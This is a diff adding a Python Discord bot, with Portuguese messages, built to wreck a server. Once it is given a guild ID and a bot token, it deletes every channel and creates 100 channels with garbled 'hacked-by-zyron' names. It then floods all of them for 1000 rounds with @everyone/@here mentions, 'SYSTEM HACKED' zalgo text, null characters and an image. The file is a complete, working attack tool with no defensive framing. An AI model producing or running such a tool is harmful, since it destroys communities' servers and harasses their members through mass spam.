@@ -1,0 +1,125 @@
+import discord
+import asyncio
+import sys
+import aiohttp
+import io
+import random
+
+TOKEN = "SEU_TOKEN_AQUI"
+IMAGE_URL = "https://cdn.discordapp.com/attachments/1438951510003290112/1473007802275467316/4e8478aaf66a577f5eba1f188f0af944.jpg?ex=6994a4eb&is=6993536b&hm=3559c5d5122ef248dec6b85655d610f96f06142008d39de0838761e2407d6387"
+
+intents = discord.Intents.default()
+intents.guilds = True
+
+ZALGO = "Ì·Ì›Ì–Ì—Ì˜Ì™ÌœÌÌžÌŸÌ Ì¡Ì¢Ì£Ì¤Ì¥Ì¦Ì©ÌªÌ«Ì¬Ì­Ì®Ì¯Ì°Ì±Ì²Ì³Ì´ÌµÌ¶Ì·Ì¸Ì¹ÌºÌ»Ì¼Ì½Ì¾Ì¿Í€ÍÍ‚ÍƒÍ„Í…Í†Í‡ÍˆÍ‰ÍŠÍ‹ÍŒÍÍŽÍÍÍ‘Í’Í“Í”Í•Í–Í—Í˜Í™ÍšÍ›ÍœÍÍžÍŸÍ Í¡Í¢Í£Í¤Í¥Í¦Í§Í¨Í©ÍªÍ«Í¬Í­Í®Í¯"
+INVISIBLE = "ã…¤" * 100
+NULL_CHARS = "\x00\x01\x02\x03\x04\x05" * 20
+MENTION = "@everyone @here " * 5
+
+def generate_lag_name():
+    base = "Ð½acÄ¸ed-Ð²y-zyronÂ¡Ñ•"
+    noise = "".join(random.choice(ZALGO) for _ in range(50))
+    invisible = "".join(random.choice(["ã…¤", "ó „€", "ó „", "ó „‚"]) for _ in range(30))
+    return base + noise + invisible
+
+def generate_spam_text(round_num, msg_num):
+    lines = []
+    for _ in range(50):
+        line = f"{MENTION}SYSTEMï¾ HACKED{random.choice(ZALGO) * random.randint(10, 50)}{INVISIBLE[:20]}{NULL_CHARS[:10]}"
+        lines.append(line)
+    
+    header = f"ã€ROUND {round_num} - MSG {msg_num}ã€‘"
+    footer = "â¸»" * 100 + "â–’" * 200
+    return header + "\n" + "\n".join(lines) + "\n" + footer
+
+class Bot(discord.Client):
+    def __init__(self):
+        super().__init__(intents=intents)
+        self.guild_id = None
+        
+    async def on_ready(self):
+        if not self.guild_id:
+            print("ID nao fornecido")
+            await self.close()
+            return
+            
+        guild = self.get_guild(int(self.guild_id))
+        if not guild:
+            print("Bot nao esta no servidor")
+            await self.close()
+            return
+        
+        print(f"Alvo: {guild.name}")
+        confirm = input("Digite SIM para destruicao total: ")
+        if confirm.strip().upper() != "SIM":
+            await self.close()
+            return
+        
+        print("Deletando canais...")
+        await asyncio.gather(*[c.delete() for c in list(guild.channels)], return_exceptions=True)
+        
+        print("Criando 100 canais...")
+        all_channels = []
+        
+        for batch in range(10):
+            tasks = []
+            for _ in range(10):
+                tasks.append(guild.create_text_channel(generate_lag_name()))
+            
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            all_channels.extend([c for c in results if isinstance(c, discord.TextChannel)])
+            await asyncio.sleep(0.1)
+        
+        print(f"Criados: {len(all_channels)}")
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.get(IMAGE_URL) as resp:
+                img_data = await resp.read() if resp.status == 200 else None
+            
+            print("Iniciando 1000 rodadas com imagem em TODAS...")
+            
+            for round_num in range(1, 1001):
+                if round_num % 100 == 0:
+                    print(f"Progresso: {round_num}/1000")
+                
+                for msg_count in range(5):
+                    tasks = []
+                    
+                    for channel in all_channels:
+                        try:
+                            content = generate_spam_text(round_num, msg_count + 1)[:1800]
+                            
+                            if img_data:
+                                file = discord.File(fp=io.BytesIO(img_data), filename="hacked.jpg")
+                                tasks.append(channel.send(content, file=file))
+                            else:
+                                tasks.append(channel.send(content))
+                                
+                        except:
+                            continue
+                    
+                    if tasks:
+                        await asyncio.gather(*tasks, return_exceptions=True)
+                
+                if round_num % 50 == 0:
+                    await asyncio.sleep(0.3)
+        
+        print("Concluido - 1000 rodadas com imagem em todas")
+        await self.close()
+
+def main():
+    if len(sys.argv) < 2:
+        print("Uso: python3 bot.py [ID_SERVIDOR]")
+        sys.exit(1)
+    
+    bot = Bot()
+    bot.guild_id = sys.argv[1]
+    
+    if TOKEN == "SEU_TOKEN_AQUI":
+        print("Configure o TOKEN")
+        sys.exit(1)
+    
+    bot.run(TOKEN)
+
+if __name__ == "__main__":
+    main()
